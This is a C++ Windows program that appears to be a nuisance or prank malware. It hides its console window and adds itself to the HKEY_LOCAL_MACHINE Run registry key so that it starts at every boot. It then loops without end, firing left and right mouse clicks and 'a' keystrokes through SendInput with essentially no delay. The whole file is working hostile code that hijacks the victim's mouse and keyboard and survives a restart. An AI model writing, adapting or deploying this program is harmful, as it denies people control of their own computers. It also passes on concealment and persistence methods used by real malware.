#include <iostream>
#include <Windows.h>
#include <string.h>
#include <tchar.h>
using namespace std;




int main()
{
	ShowWindow (GetConsoleWindow(), SW_HIDE);


    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    // GetModuleFileName returns the number of characters
    // written to the array.
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0)
    {
	_tprintf(TEXT("Unable to get module file name; last error = %lu\n"), GetLastError());
	return -1;
    }

    HKEY newValue;

    if (RegOpenKey(HKEY_LOCAL_MACHINE,
	TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&newValue) != ERROR_SUCCESS)
    {
	_tprintf(TEXT("Unable to open registry key; last error = %lu\n"), GetLastError());
	return -1;
    }
 
    // Need to pass the length of the path string in bytes,
    // which may not equal the number of characters due to
    // character set.
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(newValue,TEXT("name_me"),0,REG_SZ,(LPBYTE)szPath,pathLenInBytes) != ERROR_SUCCESS)
    {
	RegCloseKey(newValue);
	_tprintf(TEXT("Unable to set registry value; last error = %lu\n"), GetLastError());
	return -1;
    }

    RegCloseKey(newValue);

	INPUT ip;
     bool click = true;
		while (click == true)
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			Sleep(.5); 
			    // Set up a generic keyboard event.
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0; // hardware scan code for key
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
 
    
    ip.ki.wVk = 0x41; // virtual-key code for the "a" key
    ip.ki.dwFlags = 0; // 0 for key press
    SendInput(1, &ip, sizeof(INPUT));
 
    
    ip.ki.dwFlags = KEYEVENTF_KEYUP; 
    SendInput(1, &ip, sizeof(INPUT));

		}

		

 
	return 0;
}